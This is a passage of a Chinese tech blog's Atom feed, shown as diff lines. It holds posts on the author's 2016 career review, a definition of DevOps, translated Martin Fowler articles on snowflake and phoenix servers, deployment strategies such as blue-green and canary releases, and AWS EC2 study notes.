+<h2 id="成为一枚程序员"><a href="#成为一枚程序员" class="headerlink" title="成为一枚程序员"></a>成为一枚程序员</h2><p>之前的工作只是在码代码，对于代码的意义，如何成为一个网站，以及网站如何发挥它的价值是一无所知的，好在coding的内容都比较有趣，一边发掘着网络世界的神奇，一边学习养家糊口的本事。<br>从一开始的爬虫，到社工库，到端口扫描，对网络世界的认识逐步提高；从一开始不知道自己在做什么，到后来两周做的网站卖了三十万，到后来觉得技术可以改变世界；我一天天成长着，<br>直到找工作开始，我才算是真正的成为一名程序员，时间大概是在三月份左右，我笨手笨脚的搭建了自己的博客，开始系统回顾大学所学的知识，总结涉足IT行业半年以来的经验，研读一些自己没有遇到过但是别人遇到了的问题，对技术的态度由”讨口饭吃”，穿变成一种兴趣，对曾经不削一顾的计算机，竟然开始心心相惜。</p>
+<h2 id="跳槽"><a href="#跳槽" class="headerlink" title="跳槽"></a>跳槽</h2><p>时间大概是在四月份，我收到一封拉勾网的回复，”ThoughtWorks的HR对你的简历感兴趣“，当时已经拿到软通的offer，薪资不低，且有华为靠山；但比较顾虑软通工作环境不佳，会对个人发展不利；抱着试一试的想法在清明陪爷爷奶奶游玩九寨沟期间给HR发了一封自荐邮件，假期结束后当即收到了Cherry的邮件回复，欢呼雀跃之余感叹这是我理梦想最近的一次。<br>大概在年初的时候我就来过一次软件园，当时在天府五街的地铁站前，感叹这里的办公楼都好大气，因为在北京真的没见过什么正儿八经的写字楼，于是发誓将来一定要在这里上班，加上好友引荐，早就觉得ThoughtWorks是一家女神一样的公司，宽松的文化，舒适的办公环境，有很多技术大牛，入职居然还配mac电脑，哈哈，当时就这样被这家公司吸引着。后来大概花了两周时间一边上班一遍翻完了大学四年的教材，在网上看了很多python的博客，提交homework， homework过了，通知到公司面试，逻辑测试, pair, 有种不过如此的感觉，不过还是认真对待，最终拿到offer，已经是五月了。</p>
+<h2 id="复合"><a href="#复合" class="headerlink" title="复合"></a>复合</h2><p>拿到TW的offer之后果断拒绝了软通，也不再想面其他公司了，安心租房，过了一段自由自在的日子。<br>入职TW前期压力是比较大的，比找工作时更大强度的学习任务，更high-level的认知模型，在TW的最初两个月一度认为自己原来对软件开发一无所知，在此期间很感谢我的buddy给我的指引，还有好玩的同事们的帮助，海外项目组很轻松，又有很多高智商的人一起工作，没有以前公司经常可见的那种眼神呆滞的人，这样的环境让我觉得很舒服，成长也很快，在做过几次session，准备一段时间AWS认证考试无果之后，终于roll off了</p>
+<h2 id="出差北京"><a href="#出差北京" class="headerlink" title="出差北京"></a>出差北京</h2><p>大概是在11月份的时候，天很冷，而且我知道这个时候北京又雾霾，但是没有办法，我还是降临了北京，国内项目组比较辛苦，节奏比较快，度过了最初一个星期7*14小时的工作后慢慢适应了，几乎找到一些上一家公司的感觉，实践了一些反模式再回过头来看海外交付组的最佳实践，不觉暗暗点头，有道理。<br>国内交付的小伙伴们都很活跃，项目压力越大明显感到项目组氛围更好，在这里我学会了阿瓦隆，也了解到很多公司的八卦。<br>圣诞节项目上线之后，年底feedback，很快我又roll off 了。</p>
+<h2 id="家人来成都"><a href="#家人来成都" class="headerlink" title="家人来成都"></a>家人来成都</h2><p>元旦，2017结束了。<br>很多人都在总结，计划着新的一年新的开始，虽然感觉和大学时候的计划有所不同，但计划还是要有的，flag还是要立，哈哈，新年伊始，不能亏脑袋，毕竟在我精力最旺盛的年龄，我又是一个如此爱用脑的人。</p>
+<h1 id="2017盘算着制造几件大事"><a href="#2017盘算着制造几件大事" class="headerlink" title="2017盘算着制造几件大事"></a>2017盘算着制造几件大事</h1><ul>
+<li>考取AWS专家级认证</li>
+<li>考取阿里云认证</li>
+<li>争取一次Lead的机会</li>
+<li>参加公司招聘</li>
+<li>比较深入的研究云，PaaS服务</li>
+<li>了解性地学习学习算法，人工智能，区块链</li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;2016-野蛮生长的一年&quot;&gt;&lt;a href=&quot;#2016-野蛮生长的一年&quot; class=&quot;headerlink&quot; title=&quot;2016 野蛮生长的一年&quot;&gt;&lt;/a&gt;2016 野蛮生长的一年&lt;/h1&gt;&lt;h2 id=&quot;15年的尾声&quot;&gt;&lt;a href=&quot;#15年的尾声&quot; class=&quot;headerlink&quot; title=&quot;15年的尾声&quot;&gt;&lt;/a&gt;15年的尾声&lt;/h2&gt;&lt;p&gt;15年经历了北京的痛不欲生回到成都，辗转踌躇，终于找到一份工作进入IT行业，算起来迄今不过只度过了短短一年，比起影视行业摸爬滚打的2年时光，还要短些，我已俨然一副程序员模样，享受着室内舒适的工作环境，稳定的收入，付出着擅长的脑力劳动，有时候会想，不是我选择了工作，是工作选择了我；有时候也会想，会不会有一天，我又不做程序员了，什么会让我生存下去？&lt;br&gt;
+    
+    </summary>
+    
+    
+      <category term="大事记" scheme="https://www.duyidong.com/tags/%E5%A4%A7%E4%BA%8B%E8%AE%B0/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>一句话介绍DevOps是做什么的</title>
+    <link href="https://www.duyidong.com/2016/11/11/%E4%B8%80%E5%8F%A5%E8%AF%9D%E4%BB%8B%E7%BB%8DDevOps%E6%98%AF%E5%81%9A%E4%BB%80%E4%B9%88%E7%9A%84/"/>
+    <id>https://www.duyidong.com/2016/11/11/一句话介绍DevOps是做什么的/</id>
+    <published>2016-11-11T01:42:58.000Z</published>
+    <updated>2017-04-18T09:40:45.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>DevOps是一个很广泛的概念，他是一个运动，一种文化，强调团队紧密合作，以快速反馈的手段达到团队目标为交付最终价值的效果。<br>DevOps延伸而来有很多实践，包括：基础设施即代码，监控可视化，自动化测试，持续集成持续部署，集成配置管理等等。<br>每一种实践落实到行动上就要使用一些工具，比如基础设施及代码我们会引入很多配置管理工具，比如Ansible,puppet,chef,salt。可视化这一块可能会涉及到一些PaaS平台，比如AWS，Rancher等等。持续集成持续部署这一块主要就是一些CI 工具，Jenkins，GOCD，等等。</p>
+<h2 id="第二版"><a href="#第二版" class="headerlink" title="第二版"></a>第二版</h2><p>DevOps承袭自敏捷系统管理，是一种重视软件开发人员与IT运维人员之间沟通合作的技术运动。近年来，随着云计算、虚拟化等技术的迅猛发展及敏捷实践在业内的普及，质量内建、基础设施即代码、部署流水线、服务监控与健康检查、分布式问题定位及追踪等诸多DevOps实践也在各大公司IT项目中得到探索和应用。开发、测试、运维团队之间的协作性得到提高，生产环境的发布风险明显降低，缩短了持续交付的迭代周期，从而提升了组织效率，对业务连续性也起到了积极作用。因此，DevOps运动获得了越来越多从业者的认可。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;DevOps是一个很广泛的概念，他是一个运动，一种文化，强调团队紧密合作，以快速反馈的手段达到团队目标为交付最终价值的效果。&lt;br&gt;DevOps延伸而来有很多实践，包括：基础设施即代码，监控可视化，自动化测试，持续集成持续部署，集成配置管理等等。&lt;br&gt;每一种实践落实到行动
+    
+    </summary>
+    
+    
+      <category term="DevOps" scheme="https://www.duyidong.com/tags/DevOps/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>雪花服务器</title>
+    <link href="https://www.duyidong.com/2016/11/04/%E7%BF%BB%E8%AF%91-%E9%9B%AA%E8%8A%B1%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
+    <id>https://www.duyidong.com/2016/11/04/翻译-雪花服务器/</id>
+    <published>2016-11-04T07:29:52.000Z</published>
+    <updated>2017-04-12T13:34:03.000Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="雪花服务器"><a href="#雪花服务器" class="headerlink" title="雪花服务器"></a>雪花服务器</h1><p>原文链接: <a href="http://martinfowler.com/bliki/SnowflakeServer.html" target="_blank" rel="external">http://martinfowler.com/bliki/SnowflakeServer.html</a></p>
+<p>保持生产环境服务器正常运行可能是一件非常繁琐的事，你必须保证你的操作系统和应用运行的环境被及时的修补以确保是最新版本。被托管的应用需要被经常升级。应用所处的环境也需要实时调整来配合应用有效运行即与其他系统正常通信。这些操作都依赖于命令行，GUI，或者编辑配置文件。<br><a id="more"></a><br>导致的结果就是“雪花服务器” ———— 对数据中心带来不好的影响</p>
+<p>雪花服务器的第一个问题就是很难被复制。如果你的服务器硬件有问题，这就意味着你很难启动另一个服务器来提供相同的服务。如果你需要一个集群，你不能保证你启动的所有instance都是同步的。你不能复制一个产品环境来测试。当你的产品环境挂了，你将无法在你的开发测试环境重现这个错误。</p>
+<p>给你的雪花服务器创建镜像或许是一个解决方案，但是镜像往往会打包很多你不需要的配置，更别说错误也会被一同打包。</p>
+<p>然而，雪花服务器真正的脆弱，是在你需要改变他们的时候。雪花服务器很快就会变得难以理解和难以更改。对服务器的细微更改可能会引起一连串的连锁反应。你不确定配置的那一部分是重要的，哪些是遗留的。它的脆弱导致长时间，压力巨大的调制和debug。你需要手动流程和文档来支持你需要的更改。这也是为什么我们通常会看到很多重要的软件会运行在一个非常老旧的操作系统里。</p>
+<p>避免雪花服务的一个好的方式是以某种自动化的方式掌握整个运维过程的配置。Puppet和chef都可以做到这点，你可以用修改配置文件的方式将修改应用到你所有的环境中。</p>
+<p>自动化配置管理的的好处不仅是你可以重新build一个新的server，更重要的是你可以很容易知道你对一台服务器进行了什么样的配置，从而可以很容易更改。更长远的看，既然配置文件是文本格式，你可以把它纳入版本管理，就实现了基础设施即代码的好处。</p>
+<p>应用部署需要遵循一个简单的准则：完全自动化，所有改变纳入版本管理。<br>通过避免雪花服务，可以带来的好处是你可以完全复制你的产品环境来进行测试，减少配置误差导致的缺陷。</p>
+<p>一个很好地方式确保你不会陷入雪花服务器的困境就是使用凤凰服务。对配置进行版本管理是持续交付的重要部分。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;雪花服务器&quot;&gt;&lt;a href=&quot;#雪花服务器&quot; class=&quot;headerlink&quot; title=&quot;雪花服务器&quot;&gt;&lt;/a&gt;雪花服务器&lt;/h1&gt;&lt;p&gt;原文链接: &lt;a href=&quot;http://martinfowler.com/bliki/SnowflakeServer.html&quot;&gt;http://martinfowler.com/bliki/SnowflakeServer.html&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;保持生产环境服务器正常运行可能是一件非常繁琐的事，你必须保证你的操作系统和应用运行的环境被及时的修补以确保是最新版本。被托管的应用需要被经常升级。应用所处的环境也需要实时调整来配合应用有效运行即与其他系统正常通信。这些操作都依赖于命令行，GUI，或者编辑配置文件。&lt;br&gt;
+    
+    </summary>
+    
+    
+      <category term="翻译" scheme="https://www.duyidong.com/tags/%E7%BF%BB%E8%AF%91/"/>
+    
+      <category term="雪花服务器" scheme="https://www.duyidong.com/tags/%E9%9B%AA%E8%8A%B1%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>凤凰式服务</title>
+    <link href="https://www.duyidong.com/2016/11/02/%E7%BF%BB%E8%AF%91-%E5%87%A4%E5%87%B0%E5%BC%8F%E6%9C%8D%E5%8A%A1/"/>
+    <id>https://www.duyidong.com/2016/11/02/翻译-凤凰式服务/</id>
+    <published>2016-11-02T09:06:13.000Z</published>
+    <updated>2017-04-12T13:34:07.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>原文链接： <a href="http://martinfowler.com/bliki/PhoenixServer.html" target="_blank" rel="external">http://martinfowler.com/bliki/PhoenixServer.html</a></p>
+<p>有一天我突然幻想一个验证运营的服务，这个服务就是我如果跑去把公司的数据中心关掉，这毫无疑问将至我们公司的产品服务于危机之中，而这个服务的评定标准则是运营图团队需要花费多少时间能让我们的产品应用重新恢复正常。<br><a id="more"></a></p>
+<p>这或许只是个幻想，但其中包含着金子一样的智慧，你完全可以尝试定期毁掉你的服务器，一个服务应该像凤凰，定期从灰烬里重生。</p>
+<p>凤凰式服务首要的好处是避免配置飘移（Configuration dirft）：对操作系统指定的更改不会被记录，配置飘逸是一个巨大的泥潭，你不会希望被陷进去的。</p>
+<p>一个解决配置漂移的方法就是用一个软件自动地同步服务器配置达到一个已知的统一标准。Puppet和Chef（还有Ansible和salt）两个工具都可以做到这点，不停的重复申请他们定义的资源（所以他们也可以用于实践凤凰式服务），但这些工具的局限性是他们只能控制他们定义的那一部分配置，在他们定义以外的配置漂移不会被修复。而凤凰是从无到有的，它可以覆盖所有的资源配置。</p>
+<p>但这并不是说重复应用配置是无用的，毕竟它更快，破坏性也更小。他对解决配置飘移仍是有用的。</p>
+<p>e.g.<br>知名网站Netflix有一个chaos monkey专门用来随机毁掉一些服务来确保他们服务的弹性（高可用性）。</p>
+<p>注： 配置飘移?Configuration Dirft大意：<br>在一个生产环境的服务器中，比如一个数据库集群，由于数据库密码变动导致主从数据库不一致，或者在使用脚本去更改服务器配置的过程中让同一个环境下的服务器发生了配置不一致的情况.<br>参考链接：</p>
+<ul>
+<li><a href="http://kief.com/configuration-drift.html" target="_blank" rel="external">http://kief.com/configuration-drift.html</a></li>
+<li><a href="http://www.continuitysoftware.com/blog/what-is-configuration-drift/" target="_blank" rel="external">http://www.continuitysoftware.com/blog/what-is-configuration-drift/</a></li>
+<li><a href="https://cdn2.hubspot.net/hub/166743/file-22343462-pdf/docs/cios-guide-to-avoid-configuration-drift.pdf" target="_blank" rel="external">https://cdn2.hubspot.net/hub/166743/file-22343462-pdf/docs/cios-guide-to-avoid-configuration-drift.pdf</a></li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;原文链接： &lt;a href=&quot;http://martinfowler.com/bliki/PhoenixServer.html&quot;&gt;http://martinfowler.com/bliki/PhoenixServer.html&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;有一天我突然幻想一个验证运营的服务，这个服务就是我如果跑去把公司的数据中心关掉，这毫无疑问将至我们公司的产品服务于危机之中，而这个服务的评定标准则是运营图团队需要花费多少时间能让我们的产品应用重新恢复正常。&lt;br&gt;
+    
+    </summary>
+    
+    
+      <category term="凤凰式服务" scheme="https://www.duyidong.com/tags/%E5%87%A4%E5%87%B0%E5%BC%8F%E6%9C%8D%E5%8A%A1/"/>
+    
+      <category term="翻译" scheme="https://www.duyidong.com/tags/%E7%BF%BB%E8%AF%91/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>部署和发布策略的演进</title>
+    <link href="https://www.duyidong.com/2016/10/24/%E9%83%A8%E7%BD%B2%E5%92%8C%E5%8F%91%E5%B8%83%E7%AD%96%E7%95%A5%E7%9A%84%E6%BC%94%E8%BF%9B/"/>
+    <id>https://www.duyidong.com/2016/10/24/部署和发布策略的演进/</id>
+    <published>2016-10-24T06:30:20.000Z</published>
+    <updated>2017-04-13T05:47:34.000Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="持续交付的目的"><a href="#持续交付的目的" class="headerlink" title="持续交付的目的"></a>持续交付的目的</h1><h2 id="以下问题有没有解决？"><a href="#以下问题有没有解决？" class="headerlink" title="以下问题有没有解决？"></a>以下问题有没有解决？</h2><p>“快速将产品推向市场” 与 “提供稳定、安全并可靠的IT服务” 是否可以兼得？<br>用更少的资源完成更多的业绩，既要保持竞争力，又要削减成本；<br>如何解决任务交接出现的问题，例如业务与开发，开发与运维之间；<br>运维人员能否和其他人一样，正常上下班，而不用在夜里或者周末加班？</p>
+<a id="more"></a>
+<h1 id="部署和发布的区别"><a href="#部署和发布的区别" class="headerlink" title="部署和发布的区别"></a>部署和发布的区别</h1><p>要弄清楚部署和发布的区别，首先要弄清楚几个名词之间的关系CI(Continues Intergation)持续集成，CD(Continues Delivery)持续交付，持续集成的目的是对代码的快速反馈，在分布式开发的团队中你的更改不会破坏已有代码功能，持续交付的scope要大一些，指的是对用户交付最终价值，传统的交付最终价值即为产生可发布的版本，有的公司在持续交付的基础之上甚至提出了持续部署（Continous Deployment），即自动化讲可发布版本放入到产品环境，其中就涉及到蓝绿部署，滚动部署等部署方式。在部署和发布解耦之后，在将产品部署到产品环境之后我们可能还有些功能是不想对用户可见的，在对用户可见的的这个过程我们称之为发布（Release）（如图）。DevOps运动则是在发布之后有引入运维和运营的角色，和用户反馈一起形成一个闭环。恩，差不多是这个样子的。</p>
+<p><img src="https://puppet.com/sites/default/files/2016-09/puppet_continuous_diagram.gif" alt=""></p>
+<p>ThoughtWorks在15年的技术雷达上已经建议解耦部署和发布:</p>
+<pre><code class="我们推荐严格区分术语“部署（Deployment）”和“发布（Release）”的使用。应用组件或基本设施的代码或配置变更在产品环境生效称为“部署”，而具有业务影响的功能变化对最终用户可见称为“发布”。使用特性开关或灰度发布等技巧可以使我们更加频繁地部署变更到产品环境但并不发布功能。频繁部署可以有效降低变更带来的风险，同时业务负责人仍然能保持何时向最终用户发布功能的控制。```">
+# 零宕机发布（目标）
+```零宕机发布指的一种将用户从一个版本几乎瞬间转移到另一个版本上的方法，更重要的是，如果出了什么问题，他还要能在瞬间把用户从这个版本转回到原先的版本上。
+</code></pre>
+<p>零宕机发布的关键在于将发布流程中不同的部分解耦，尽量使他们能独立发生。</p>
+<h1 id="凤凰式部署"><a href="#凤凰式部署" class="headerlink" title="凤凰式部署"></a>凤凰式部署</h1><p>将产品环境和应用打包发布，在容器产生之前是将系统和应用制作镜像的方式进行发布，避免产品环境和非生产环境不一致导致发布失败，但是这种发布方式因为笨重而被容器取代。</p>
+<ul>
+<li>便于回滚</li>
+<li>提高计算资源的利用率：相对以操作系统为计算单元的管理方式，容器不仅更轻量而且极大提高了计算资源的利用率，且容器本身不占用计算资源。而且相对image的方式，管理成本，备份的cost也极大降低</li>
+<li>更快的部署时间：image的方式需要一天，snapshot需要十分钟，Container则可以把这个时间缩短到秒级</li>
+<li>解决了环境不一致的问题</li>
+<li>跨平台</li>
+<li>prodocut team over project team:每个team可以更方便的管理自己的platform资源，极大地降低了team之间的沟通成本。（相对application team和platfor team分离的情况）</li>
+</ul>
+<p>风险：安全，容器必须是以root权限泡在宿主机上，不同容器共享一个宿主机，如果一个容器被贡献则会威胁到所有在改宿主机上的服务。<br>解决方案：</p>
+<ul>
+<li>及时更新宿主机系统版本，避免内核漏洞</li>
+<li>扫描bese image, 避免Container本身系统漏洞</li>
+<li>base image可以加入主动防御（e.g.ossec）</li>
+<li>控制好容器操作权限</li>
+</ul>
+<h1 id="滚动发布-Rolling-Release"><a href="#滚动发布-Rolling-Release" class="headerlink" title="滚动发布(Rolling Release)"></a>滚动发布(Rolling Release)</h1><p>又称滚动更新(rolling update)<br>指的是在不切换负载均衡器或者DNS的前提下把负载均衡器下的机器一台台关掉，部署好之后再挂到负载均衡器下面，与蓝绿部署直观的差别是不需要切换负载均衡器或DNS，同时做到零宕机部署。（还要完善）</p>
+<h1 id="蓝绿部署（BuleGreen-Deployment）"><a href="#蓝绿部署（BuleGreen-Deployment）" class="headerlink" title="蓝绿部署（BuleGreen Deployment）"></a>蓝绿部署（BuleGreen Deployment）</h1><p>在发布之前就把应用程序放在产品环境上部署好，如果“发布”能像重新配置一下路由器那样简单，让他直接指向生产环境，那就更好了 ————《持续交付》<br>蓝绿部署主要解决的是宕机发布的问题<br>它的主要原理是在保持旧版本环境（绿环境）正常运行的情况下，准备一套蓝环境，在产品环境里蓝环境通过充分冒烟测试后再将用户访问从绿环境切换到蓝环境，如果蓝环境在这个切换之后出现问题则立即切换回绿环境，如果没有问题则最后destroy掉绿环境，具体做法可以通过DNS或者ELB配合AutoScaling Group进行Infrastructure的切换，这种切换通常在一秒之内就可以搞定。application层的回话切换以及数据库链接切换的问题，可以使用中间件解决。</p>
+<p><img src="http://martinfowler.com/bliki/images/blueGreenDeployment/blue_green_deployments.png" alt=""></p>
+<p>对于数据库，直接从绿环境切换到蓝环境是不可能的，因为如果数据库结构发生改变的话，数据迁移需要时间。解决这种情况最理想的方法是在一小段时间把数据库变成只读状态，完成迁移后再将用户切换到蓝环境，恢复读写。如果在切换过程中仍然有数据的写入，你可以采用添加中间件的方式保存读写数据，或者在在读写过程中持续将事物发向新旧两个数据库。<br></p>
+<h1 id="灰度发布（金丝雀发布）"><a href="#灰度发布（金丝雀发布）" class="headerlink" title="灰度发布（金丝雀发布）"></a>灰度发布（金丝雀发布）</h1><p>在把应用程序发布给所有人之前，先试着把它发布给一小撮用户群，这种技术叫做金丝雀发布。<br>金丝雀发布要解决的问题主要是缩短反馈周期，以及弥补巨大产品环境下无法进行有效容量测试所可能导致的问题的一种手段。是一个能大大降低新版本发布风险的方法。<br>灰度发布是蓝绿部署的一个延伸，采用逐步切换的方式使新版本发布只影响到尽可能少的用户，从而为AB测试提供条件。灰度发布<br>灰度发布与金丝雀部署在操作上是等价的<br>金丝雀发有以下几个好处：</p>
+<ul>
+<li>非常容易回滚，这个其实是蓝绿部署就已经带来的好处，只要不把用户引向有问题的新版本，就可以有足够的时间用来分析错误日志，排查问题。</li>
+<li>可以将同一批用户引至不新旧版本以进行A/B测试，某些公司可以度量新特性的使用率，某些公司可以度量该版本带来的收益，你不必将大量用户引入A/B测试，只需要有代表性的样本就足够了。</li>
+<li>可以通过逐渐增加负载，记录并衡量应用程序响应时间，CPU使用率，I/O，内存使用率以及日志中是否有异常报告这种方式来检查应用程序是否满足容量需求，降低容量测试不理想带来的风险。</li>
+</ul>
+<p>另外，需要注意的是，在生产环境中保留尽可能少的版本也是非常重要的，最好限制在两个版本之内。</p>
+<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><ul>
+<li>紧急修复：一定不要破坏流程，不要直接对生产环境进行修改。</li>
+<li>持续部署：If it hurts, do it more often</li>
+<li>持续发布用户自行安装的软件？发布方式？</li>
+<li>执行部署的人应该参与部署过程的创建（Dev和Ops的紧密合作）</li>
+<li>记录部署活动（自动化更佳）</li>
+<li>不要删除旧文件，而是移动到别的位置。在Unix环境中，一个最佳实践是把每个版本部署到不同的文件夹中，创建一个符号链接文件指向最新版本，版本的部署和回滚就只是改一下符号链接这么简单。</li>
+<li>部署是整个团队的责任（DevOps）</li>
+<li>快速失败，部署脚本也应该纳入测试中，这些测试应该被作为部署的一部分来工作。</li>
+<li>数据库最好向前兼容</li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;持续交付的目的&quot;&gt;&lt;a href=&quot;#持续交付的目的&quot; class=&quot;headerlink&quot; title=&quot;持续交付的目的&quot;&gt;&lt;/a&gt;持续交付的目的&lt;/h1&gt;&lt;h2 id=&quot;以下问题有没有解决？&quot;&gt;&lt;a href=&quot;#以下问题有没有解决？&quot; class=&quot;headerlink&quot; title=&quot;以下问题有没有解决？&quot;&gt;&lt;/a&gt;以下问题有没有解决？&lt;/h2&gt;&lt;p&gt;“快速将产品推向市场” 与 “提供稳定、安全并可靠的IT服务” 是否可以兼得？&lt;br&gt;用更少的资源完成更多的业绩，既要保持竞争力，又要削减成本；&lt;br&gt;如何解决任务交接出现的问题，例如业务与开发，开发与运维之间；&lt;br&gt;运维人员能否和其他人一样，正常上下班，而不用在夜里或者周末加班？&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="持续交付" scheme="https://www.duyidong.com/tags/%E6%8C%81%E7%BB%AD%E4%BA%A4%E4%BB%98/"/>
+    
+      <category term="DevOps" scheme="https://www.duyidong.com/tags/DevOps/"/>
+    
+      <category term="部署与发布" scheme="https://www.duyidong.com/tags/%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%8F%91%E5%B8%83/"/>
+    
+      <category term="持续部署" scheme="https://www.duyidong.com/tags/%E6%8C%81%E7%BB%AD%E9%83%A8%E7%BD%B2/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>AWS_EC2</title>
+    <link href="https://www.duyidong.com/2016/09/28/AWS-EC2/"/>
+    <id>https://www.duyidong.com/2016/09/28/AWS-EC2/</id>
+    <published>2016-09-28T06:53:34.000Z</published>
+    <updated>2017-02-18T13:54:38.000Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="AWS-EC2是什么？"><a href="#AWS-EC2是什么？" class="headerlink" title="AWS EC2是什么？"></a>AWS EC2是什么？</h1><p>Amazon Elastic Compulte Cloud(EC2)提供了可伸缩的计算资源，使你可以快速开发/部署你的应用，有了它你可以快速起一个应用，配置安全，网络，以及存储。他可以更灵活，更快地适应你对需求。</p>
+<a id="more"></a>
+<h2 id="EC2定义了以下规则"><a href="#EC2定义了以下规则" class="headerlink" title="EC2定义了以下规则"></a>EC2定义了以下规则</h2><ul>
+<li><strong>Instance:</strong> 虚拟计算环境</li>
+<li><strong>AMI(Amazon Machine Images):</strong> EC2环境的一个预配置</li>
+<li><strong>Instance type:</strong> instance的存储，CPU，内存，存储，网络，地位 </li>
+<li><strong>Key pair:</strong> 用于安全登录你的instance（Amazon保存piublic key,你需要小心保存自己那份private key）</li>
+<li><strong>Instance store volumes:</strong> 临时存储数据，当你stop或者terminate你的机器的时候就会被删除</li>
+<li><strong>EBS(Amazon Elastic Block Store)</strong> 长期存储volume的数据</li>
+<li><strong>Regions AZ</strong> 给你的资源多个物理地址</li>
+<li><strong>Security Group</strong> 防火墙，用于定义通信策略，端口，可通信网段</li>
+<li><strong>Tags</strong> 元数据（metadata）可以与资源绑定</li>
+<li><p><strong>(VPCs)virtual private clouds</strong> 虚拟网络，你可以配置用于和你自己的网络通信</p>
+<p>AWS提倡的是低费用，只为你用到的服务买单，可伸缩，可测量，帮助你快速将资源和需求对应起来，灵活地run你的软件，让你可以将你的想法更快地实施到市场。</p>
+</li>
+</ul>
+<h2 id="学习AWS-EC2总共分几步："><a href="#学习AWS-EC2总共分几步：" class="headerlink" title="学习AWS EC2总共分几步："></a>学习AWS EC2总共分几步：</h2><h3 id="basics"><a href="#basics" class="headerlink" title="basics"></a>basics</h3><ul>
+<li>Instance and AMIs</li>
+<li>Regions and Availablity Zones</li>
+<li>Instance Types</li>
+<li>Tags</li>
+</ul>
+<h3 id="Networking-and-Security"><a href="#Networking-and-Security" class="headerlink" title="Networking and Security"></a>Networking and Security</h3><ul>
+<li>Amazon EC2 Key Pairs</li>
+<li>Security Groups</li>
+<li>Elastic IP Addresses</li>
+<li>Amazon EC2 and Amazon VPC</li>
+</ul>
+<h3 id="Storage"><a href="#Storage" class="headerlink" title="Storage"></a>Storage</h3><ul>
+<li>Amazon EBS</li>
+<li>Instance Store</li>
+</ul>
+<h2 id="和EC2有关的服务"><a href="#和EC2有关的服务" class="headerlink" title="和EC2有关的服务"></a>和EC2有关的服务</h2><ul>
+<li><strong>ELB（Elastic Load Balancing）</strong> 在不同的instance之间自动分发进来的请求</li>
+<li><strong>CloudWatch</strong> 实现监视器功能用于监控你的instance</li>
+<li><strong>CouldTrail</strong> 监控所有通向EC2的call，包括AWS console commandline tools以及其他服务</li>
+</ul>
+<h2 id="如何操作EC2资源"><a href="#如何操作EC2资源" class="headerlink" title="如何操作EC2资源"></a>如何操作EC2资源</h2><p><code>CLI</code> <code>PowerShell 工具</code><br>AWS提供接口为HTTP或者HTTPs的请求提供响应。可以在 <code>Amazon EC2 API Reference</code>里面设置响应（Action）<br>如果你想使用语言接入，AWS也提供SDK工具</p>
+<h2 id="付费方式"><a href="#付费方式" class="headerlink" title="付费方式"></a>付费方式</h2><p>可以按小时付费（大部分时候我们采用这种方式），也可以先预付一笔钱，然后保留一到三年，这样会比较便宜一些。还有竞价方式，这个不需要太了解。</p>
+<h2 id="Security-Best-Practice"><a href="#Security-Best-Practice" class="headerlink" title="Security Best Practice"></a>Security Best Practice</h2><ul>
+<li>使用IAM(AWS Identity and Access Management)控制AWS资源的访问权限</li>
+<li>设置Security Group用于仅允许信任的设备接入开放的端口</li>
+<li>经常review你的Security Group设置，确保你赋予了“最小可用权限”，为不同的网络需求创建不同的SG</li>
+<li>禁止密码登录</li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;AWS-EC2是什么？&quot;&gt;&lt;a href=&quot;#AWS-EC2是什么？&quot; class=&quot;headerlink&quot; title=&quot;AWS EC2是什么？&quot;&gt;&lt;/a&gt;AWS EC2是什么？&lt;/h1&gt;&lt;p&gt;Amazon Elastic Compulte Cloud(EC2)提供了可伸缩的计算资源，使你可以快速开发/部署你的应用，有了它你可以快速起一个应用，配置安全，网络，以及存储。他可以更灵活，更快地适应你对需求。&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="AWS" scheme="https://www.duyidong.com/tags/AWS/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>2016八月学习小计</title>
+    <link href="https://www.duyidong.com/2016/09/01/2016%E5%85%AB%E6%9C%88%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%A1/"/>
+    <id>https://www.duyidong.com/2016/09/01/2016八月学习小计/</id>
+    <published>2016-09-01T11:27:38.000Z</published>
+    <updated>2017-02-18T13:54:06.000Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="八月学习小计"><a href="#八月学习小计" class="headerlink" title="八月学习小计"></a>八月学习小计</h1><p>基本上讲，这两个月一直都在写文档，做PPT，提升所谓Consultant能力。<br>除此之外比较系统地学习了Shell和一些Linux有关的知识，自认为自身短板还是在技术上。</p>
+<a id="more"></a>
+<p>个人觉得以下分析问题的方式还是比较面向过程和面向任务，比较适合团队Retro，并不是很适合做自我总结。不过还是想试一下。</p>
+<h2 id="内容回顾"><a href="#内容回顾" class="headerlink" title="内容回顾"></a>内容回顾</h2><h3 id="Technique"><a href="#Technique" class="headerlink" title="Technique"></a>Technique</h3><ul>
+<li>Shell(Done)</li>
+<li>Linux(In porgress)</li>
+</ul>
+<h3 id="Commuity"><a href="#Commuity" class="headerlink" title="Commuity"></a>Commuity</h3><ul>
+<li>Shell Workshop(Done)</li>
+<li>搜集整理团队资料(In porgress)</li>
+</ul>
+<h3 id="LeaderShip"><a href="#LeaderShip" class="headerlink" title="LeaderShip"></a>LeaderShip</h3><ul>
+<li>CAT release standard(In porgress)</li>
